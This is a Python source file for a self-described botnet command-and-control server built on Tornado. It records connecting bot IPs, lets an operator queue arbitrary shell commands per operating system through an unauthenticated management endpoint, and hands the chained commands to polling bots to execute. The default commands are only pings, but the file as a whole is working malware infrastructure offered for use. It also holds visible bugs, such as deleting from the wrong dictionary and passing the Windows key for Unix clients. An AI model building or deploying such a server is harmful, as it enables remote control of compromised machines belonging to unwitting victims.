'''
    This is a botnet server implementation.
'''


import tornado.ioloop
import tornado.web

import tornado.options
from tornado.options import options, define
import httpagentparser
import json
import time
import os
import uuid


define('debug', default=True, help="debug mode", type=bool)


class ClientCache:
    def __init__(self):
        self.nodes = {}

    def add_node(self, clientIp):
        if clientIp not in self.nodes:
            self.nodes[clientIp] = {
                'last_seen': int(time.time() * 1000),
                'windows': [],
                'unix': [],
            }
        else:
            self.nodes[clientIp]['last_seen'] = int(time.time() * 1000)

    def commands_to_execute(self, clientIp, commands, os='unix'):
        """
        Returns which commands to execute, skips commands which were already executed once
        """

        to_execute = []
        for key, value in commands.items():
            command, repeat = value
            if key not in self.nodes[clientIp][os]:
                self.nodes[clientIp][os].append(key)
                to_execute.append(command)
            elif repeat:
                to_execute.append(command)
        return to_execute

    def clean_up_expired(self):
        nodes_to_delete = []
        for key, values in self.nodes.items():
            if int(time.time() * 1000) - values['last_seen'] > 1000*60:  # last seen 1 minute ago
                nodes_to_delete.append(key)

        for node in nodes_to_delete:
            del nodes_to_delete[node]


class MainHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        self.render('index.html')


class NodesHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        key = self.get_argument('key', '')
        if key:
            self.write(json.dumps(self.application.clients_cache.nodes.get(key, {})))
        self.write(json.dumps(self.application.clients_cache.nodes))


class CommandHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        # list method
        self.write(json.dumps(self.application.commands, ensure_ascii=False))

    def post(self):
        key = uuid.uuid4().hex
        sys_os = self.get_argument('os', 'unix')
        command = self.get_argument('cmd', '')
        repeat = self.get_argument('repeat', '')
        repeat = True if repeat in ['true', 'True', True] else False

        if sys_os in ['windows', 'unix']:
            self.application.commands[sys_os][key] = command, repeat
        else:
            self.set_status(400)

    def delete(self):
        
        key = self.get_argument('key', '')
        sys_os = self.get_argument('os', '')

        if sys_os in ['windows', 'unix']:
            del self.application.commands[sys_os][key]
        else:
            self.set_status(404)


class BotnetCommandsController(tornado.web.RequestHandler):
    def get(self):
        headers = self.request.headers
        clientIp = self.request.remote_ip
        self.application.clients_cache.add_node(clientIp)

        if 'windows' in headers.get('User-Agent', '').lower():
            commands = self.application.commands['windows']
            re = self.application.clients_cache.commands_to_execute(clientIp,
                                                                    commands,
                                                                    'windows')
            self.write(' ; '.join(re))
        else:
            # unix system
            commands = self.application.commands['unix']
            re = self.application.clients_cache.commands_to_execute(clientIp,
                                                                    commands,
                                                                    'windows')
            self.write(' && '.join(re))

        self.finish()  # write response to client
        self.application.clients_cache.clean_up_expired()


class Application(tornado.web.Application):
    """
    """
    def __init__(self):
        handlers = [
            (r"/commands", BotnetCommandsController),
            (r"/commands_management", CommandHandler),
            (r"/list_nodes", NodesHandler),
            (r"/.*", MainHandler),
            ]

        self.clients_cache = ClientCache()

        self.commands = dict(
            windows={
                'pingas': ('ping -n 1 google.com', True),
                'nepingas': ('ping -n 2 facebook.com', False)
            },
            unix={
                'pingas': ('ping -c 1 google.com', True),
                'nepingas': ('ping -c 2 facebook.com', False)
            })

        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "public"),
            static_path=os.path.join(os.path.dirname(__file__), "public"),
            debug=options.debug,
        )

        super(Application, self).__init__(handlers, **settings)


if __name__ == "__main__":
    tornado.options.parse_command_line()
    app = Application()
    app.listen(8080)
    tornado.ioloop.IOLoop.current().start()
